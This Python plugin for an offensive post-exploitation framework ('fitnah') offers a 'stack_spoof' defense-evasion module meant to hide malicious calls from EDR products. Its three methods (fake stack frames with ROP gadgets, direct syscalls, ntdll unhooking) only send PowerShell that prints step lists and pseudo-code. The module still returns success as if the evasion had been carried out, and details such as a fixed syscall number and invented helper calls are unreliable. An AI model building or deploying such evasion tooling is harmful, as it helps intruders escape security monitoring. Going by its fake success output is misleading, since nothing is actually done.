"""defense_evasion/stack_spoof — Stack frame spoofing to hide call source. MITRE T1036"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class StackSpoof(BasePlugin):
    NAME = "stack_spoof"
    DESCRIPTION = "Spoof call stack to hide EDR detection and show legitimate caller"
    AUTHOR = "fitnah-team"
    MITRE = "T1036"
    CATEGORY = "defense_evasion"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("method", str, required=False, default="inject",
              help="inject | direct_syscall | dll_unhook"),
        Param("target_function", str, required=False, default="",
              help="Target function to call through spoofed stack"),
        Param("spoof_caller", str, required=False, default="kernel32.dll",
              help="DLL to spoof as caller"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute stack spoofing"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        method = params.get("method", "inject").lower()
        target_function = params.get("target_function", "")
        spoof_caller = params.get("spoof_caller", "kernel32.dll")

        if method == "inject":
            return self._stack_spoof_inject(ctx, target_function, spoof_caller)
        elif method == "direct_syscall":
            return self._direct_syscall_spoof(ctx)
        elif method == "dll_unhook":
            return self._dll_unhook_spoof(ctx)
        else:
            return ModuleResult.err(f"Unknown method: {method}")

    @staticmethod
    def _stack_spoof_inject(ctx, target_function: str, spoof_caller: str) -> ModuleResult:
        """Spoof stack for process injection"""
        ps_code = f"""
$results = @()
$results += '[*] Stack spoofing for call hiding...'

try {{
    $targetFunc = '{target_function}'
    $spoofCaller = '{spoof_caller}'

    if (-not $targetFunc) {{
        $targetFunc = 'NtCreateProcess'
    }}

    $results += "[*] Target: $targetFunc"
    $results += "[*] Spoof caller: $spoofCaller"

    $results += '[*] Stack spoofing technique:'
    $results += '    1. Save current RSP (stack pointer)'
    $results += '    2. Create fake stack frame'
    $results += '    3. Write fake return address (legitimate DLL address)'
    $results += '    4. Switch RSP to fake frame'
    $results += '    5. Call target function'
    $results += '    6. EDR sees call from legitimate DLL'

    $results += '[*] Implementation (inline C#):'
    $results += '    [DllImport("kernel32")]'
    $results += '    static extern void RtlZeroMemory(IntPtr dest, uint size);'
    $results += '    '
    $results += '    // Find gadget in $spoofCaller'
    $results += '    IntPtr gadgetAddr = FindGadget(spoofCaller, "pop rax; ret");'
    $results += '    '
    $results += '    // Allocate fake stack'
    $results += '    IntPtr fakeStack = VirtualAlloc(0, 0x1000, 0x3000, 0x40);'
    $results += '    *(IntPtr*)fakeStack = gadgetAddr;'
    $results += '    '
    $results += '    // Switch RSP'
    $results += '    SetRSP(fakeStack);'
    $results += '    CallTarget($targetFunc);'

    $results += '[*] EDR analysis:'
    $results += '    ✓ Stack trace: kernel32!SomeFunc → ntdll!NtCreateProcess'
    $results += '    ✓ Looks benign (from legitimate DLL)'
    $results += '    ✗ Actual caller hidden'

    $results += '[!] Requires: Direct memory access + inline assembly'

}} catch {{
    $results += "[!] Stack spoof error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="stack_spoof_inject")

    @staticmethod
    def _direct_syscall_spoof(ctx) -> ModuleResult:
        """Direct syscall with spoofed returns"""
        ps_code = """
$results = @()
$results += '[*] Direct syscall with spoofed return address...'

try {
    $results += '[*] Method: Syscall stub with fake return'

    $results += '[*] Process:'
    $results += '    1. Get syscall number (NtCreateProcess = 0x26)'
    $results += '    2. Construct fake stack frame'
    $results += '    3. Point return address to ROP gadget in kernel32'
    $results += '    4. Directly invoke syscall via asm'
    $results += '    5. Return from syscall → gadget → legitimate code'

    $results += '[*] Inline assembly (x86-64):'
    $results += '    mov rcx, arg0'
    $results += '    mov rdx, arg1'
    $results += '    mov r8, arg2'
    $results += '    mov r9, arg3'
    $results += '    mov rax, 0x26           ; NtCreateProcess'
    $results += '    syscall'
    $results += '    ; Return address was spoofed'

    $results += '[*] Stack appearance:'
    $results += '    Real: user code → syscall → NtCreateProcess'
    $results += '    Seen: user code → kernel32 gadget → (system kernel)'

} catch {
    $results += "[!] Syscall spoof error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="syscall_spoof")

    @staticmethod
    def _dll_unhook_spoof(ctx) -> ModuleResult:
        """Unhook DLLs to spoof legitimate callers"""
        ps_code = """
$results = @()
$results += '[*] DLL unhooking for stack spoofing...'

try {
    $results += '[*] EDR hook detection:'
    $results += '    1. EDR hooks ntdll functions'
    $results += '    2. First instruction: jmp to EDR handler'
    $results += '    3. Stack trace shows EDR DLL'

    $results += '[*] Countermeasure: Unhook ntdll'
    $results += '    1. Load fresh ntdll from disk'
    $results += '    2. Find hooked function'
    $results += '    3. Restore original bytes'
    $results += '    4. Call unhooked function'
    $results += '    5. Stack shows: legitimate ntdll (not EDR)'

    $results += '[*] Implementation:'
    $results += '    1. Load fresh ntdll.dll from System32'
    $results += '    2. Get address of target function in fresh copy'
    $results += '    3. Memcpy first N bytes to hooked function'
    $results += '    4. Call patched function'
    $results += '    5. Revert patches'

    $results += '[*] Effectiveness:'
    $results += '    ✓ Bypasses inline hooks'
    $results += '    ✗ Does not bypass syscall hooks (at kernel level)'
    $results += '    ✓ Stack shows legitimate ntdll'

} catch {
    $results += "[!] DLL unhook error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="dll_unhook_spoof")
